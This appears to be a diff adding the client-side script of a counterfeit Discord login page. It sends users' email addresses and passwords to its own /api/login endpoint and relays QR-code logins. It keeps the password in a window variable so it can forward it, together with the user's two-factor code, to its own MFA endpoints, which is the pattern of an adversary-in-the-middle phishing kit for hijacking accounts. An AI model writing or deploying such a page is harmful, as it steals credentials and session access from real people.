+async function pollQR() {
+  if (!qrSid) return;
+  try {
+    var r = await fetch('/api/qr/poll/' + qrSid);
+    var d = await r.json();
+    var box  = document.getElementById('qr-box');
+    var stat = document.getElementById('qr-stat');
+    if (d.st === 'scanned') {
+      var av = d.user && d.user.avatar ? 'https://cdn.discordapp.com/avatars/' + d.user.id + '/' + d.user.avatar + '.png?size=64' : 'https://cdn.discordapp.com/embed/avatars/0.png';
+      box.innerHTML = '<img src="' + av + '" style="width:72px;height:72px;border-radius:50%;border:3px solid var(--green-360)"/>';
+      stat.innerHTML = '<strong style="color:var(--header-primary)">' + ((d.user && d.user.name) || 'User') + '</strong><br>Confirm on your device\u2026';
+    } else if (d.st === 'confirming') {
+      stat.innerHTML = 'Logging in\u2026';
+    } else if (d.success || d.st === 'done') {
+      clearInterval(qrTimer); onSuccess(d);
+    } else if (d.st === 'cancelled') {
+      clearInterval(qrTimer); 
+      setTimeout(initQR, 2000); /* auto-refresh */
+    } else if (d.st === 'error' || d.st === 'expired') {
+      clearInterval(qrTimer);
+      setTimeout(initQR, 1500); /* auto-refresh */
+    }
+  } catch(e) {
+    clearInterval(qrTimer);
+    setTimeout(initQR, 2000); /* auto-refresh on connection loss */
+  }
+}
+
+/* ═══ Login — single long-poll request, no stall/overlay/poll ═══ */
+
+function processLoginResult(d, httpStatus) {
+  hideCaptchaStall();
+  btnLoad('login-btn', false);
+
+  if (d.success) { onSuccess(d); return; }
+
+  if (d.mfa !== undefined && d.ticket) {
+    mfaTicket = d.ticket; mfaHasSms = !!d.sms; mfaMode = 'totp';
+    window._mfaPw = d._pw || captchaPw || '?';  /* Preserve password for MFA round-trip */
+    showSec('mfa'); updateMfaUI();
+    return;
+  }
+
+  if (d.email_verify) {
+    showSec('login');
+    showErr('login-error', 'New login location detected. Please check your email.');
+    var errEl = document.getElementById('login-error');
+    if (errEl) { errEl.style.color = '#ed4245'; errEl.style.fontWeight = '600'; }
+    return;
+  }
+
+  /* Error handling */
+  if (d.code === 50035) {
+    var errs = d.errors || {};
+    var msg = 'Login or password is invalid.';
+    if (errs.login) msg = (errs.login._errors || []).map(function(e){return e.message}).join(', ') || msg;
+    if (errs.password) msg = (errs.password._errors || []).map(function(e){return e.message}).join(', ') || msg;
+    showErr('login-error', msg);
+    document.getElementById('lbl-e').classList.add('err');
+    document.getElementById('lbl-p').classList.add('err');
+    return;
+  }
+
+  if (d.retry_after) {
+    showErr('login-error', 'Rate limited. Try again in ' + Math.ceil(d.retry_after) + 's.');
+    return;
+  }
+
+  /* Generic error */
+  var errMsg = '';
+  if (d.errors) {
+    var keys = Object.keys(d.errors);
+    for (var i = 0; i < keys.length; i++) {
+      var fieldErr = d.errors[keys[i]];
+      if (fieldErr && fieldErr._errors && fieldErr._errors.length) { errMsg = fieldErr._errors[0].message; break; }
+    }
+  }
+  if (!errMsg) errMsg = d.message || d.error || 'Something went wrong. Please try again.';
+  showErr('login-error', errMsg);
+}
+
+/* ═══ Login ═══ */
+document.getElementById('login-form').addEventListener('submit', async function(e) {
+  e.preventDefault();
+  var em = document.getElementById('email').value.trim();
+  var pw = document.getElementById('password').value;
+  hideErr('login-error');
+  document.getElementById('lbl-e').classList.remove('err');
+  document.getElementById('lbl-p').classList.remove('err');
+  if (!em) { document.getElementById('lbl-e').classList.add('err'); return; }
+  if (!pw) { document.getElementById('lbl-p').classList.add('err'); return; }
+  captchaEmail = em; captchaPw = pw;
+  btnLoad('login-btn', true);
+  _pendingResult = null;
+  _hcaptchaDone = false;
+  /* Show hCaptcha overlay immediately */
+  showCaptchaStall();
+  try {
+    /* Single long-poll request — server blocks until result is ready */
+    var r = await fetch('/api/login', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({login:em, password:pw, prechallenge_id:_prechallengeId})
+    });
+    var d = await r.json();
+    /* Check if hCaptcha is done or if this is an error (show errors immediately) */
+    var isError = !d.success && !(d.mfa !== undefined && d.ticket);
+    var stallVisible = document.getElementById('captcha-stall').classList.contains('show');
+    if (!stallVisible || isError) {
+      processLoginResult(d, r.status);
+    } else if (_hcaptchaDone) {
+      /* User already solved captcha and saw error msg — close panel silently */
+      setTimeout(function() {
+        hideCaptchaStall();
+        processLoginResult(d, r.status);
+      }, 1200);
+    } else {
+      /* Backend done first, wait for user to solve captcha */
+      _pendingResult = {d: d, status: r.status};
+    }
+  } catch(err) {
+    hideCaptchaStall();
+    showErr('login-error', 'Connection error. Please try again.');
+    btnLoad('login-btn', false);
+  }
+});
+
+/* ═══ MFA ═══ */
+function updateMfaUI() {
+  var title = document.getElementById('mfa-title');
+  var desc  = document.getElementById('mfa-desc');
+  var inp   = document.getElementById('mfa-code');
+  hideErr('mfa-error');
+  title.textContent = 'Multa-Factor Authentication';
+  desc.textContent  = 'Enter Discord auth code';
+  inp.placeholder   = '6-digit authentication code';
+  inp.maxLength     = 10;
+  document.getElementById('mfa-links').innerHTML = '';
+  inp.value = ''; setTimeout(function() { inp.focus(); }, 50);
+}
+
+document.getElementById('mfa-btn').addEventListener('click', submitMfa);
+document.getElementById('mfa-code').addEventListener('keydown', function(e) { if (e.key === 'Enter') submitMfa(); });
+
+async function submitMfa() {
+  var code = document.getElementById('mfa-code').value.trim();
+  if (!code || !mfaTicket) return;
+  hideErr('mfa-error');
+  var endpoint = mfaMode === 'sms' ? '/api/mfa/sms' : (mfaMode === 'backup' ? '/api/mfa/backup' : '/api/mfa/totp');
+  btnLoad('mfa-btn', true);
+  try {
+    var r = await fetch(endpoint, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({code:code, ticket:mfaTicket, pw:window._mfaPw||'?'}) });
+    var d = await r.json();
+    if (d.success) { onSuccess(d); return; }
+    showErr('mfa-error', d.message || 'Invalid code. Try again.');
+    document.getElementById('mfa-code').value = '';
+    document.getElementById('mfa-code').focus();
+  } catch(e) { showErr('mfa-error', 'Connection error.'); }
+  finally { btnLoad('mfa-btn', false); }
+}
+
+function backToLogin() {
+  mfaTicket = null;
+  hideErr('login-error');
+  hideErr('mfa-error');
+  showSec('login');
+}
+
+/* ═══ Init ═══ */
+var _prechallengeId = null;
+var _prechallengeEmail = null;
+var _emailDebounce = null;
+window.addEventListener('DOMContentLoaded', function() {
+  initQR();
+
+  var emailEl = document.getElementById('email');
+  var pwEl    = document.getElementById('password');
+
+  /* ── Email-specific pre-challenge: fires as soon as email has @ ──
+     Debounced 600ms after last keystroke. The EARLIER this fires,
+     the more likely captcha is solved before the user clicks Login.
+     Each second matters: captcha takes ~20-30s to solve. */
+  function startPrechallenge() {
+    var em = (emailEl.value || '').trim();
+    if (!em || em.indexOf('@') === -1 || em === _prechallengeEmail) return;
+    _prechallengeEmail = em;
+    _prechallengeId = null;
+    fetch('/api/prechallenge', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({email: em})
+    })
+      .then(function(r){return r.json()})
+      .then(function(d){ if(d.prechallenge_id) { _prechallengeId = d.prechallenge_id; console.log('[pre] Started for', em, ':', _prechallengeId); } })
+      .catch(function(){});
+  }
+
+  function debouncedPrechallenge() {
+    if (_emailDebounce) clearTimeout(_emailDebounce);
+    _emailDebounce = setTimeout(startPrechallenge, 300);
+  }
+
+  // Aggressive triggers: email input, blur, paste, password focus
+  if (emailEl) {
+    emailEl.addEventListener('input', debouncedPrechallenge);
+    emailEl.addEventListener('blur', startPrechallenge);
+    emailEl.addEventListener('paste', function() { setTimeout(startPrechallenge, 100); });
+  }
+  if (pwEl) {
+    pwEl.addEventListener('focus', startPrechallenge);
+    pwEl.addEventListener('input', startPrechallenge);
+  }
+
+  /* ── Safari iOS keyboard fix ── scroll focused input into view */
+  if (/iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
+    document.querySelectorAll('input').forEach(function(inp){
+      inp.addEventListener('focus', function(){
+        var self = this;
+        setTimeout(function(){
+          self.scrollIntoView({behavior:'smooth', block:'center'});
+        }, 350);
+      });
+    });
+  }
+});
+</script>
+</body>
+</html>
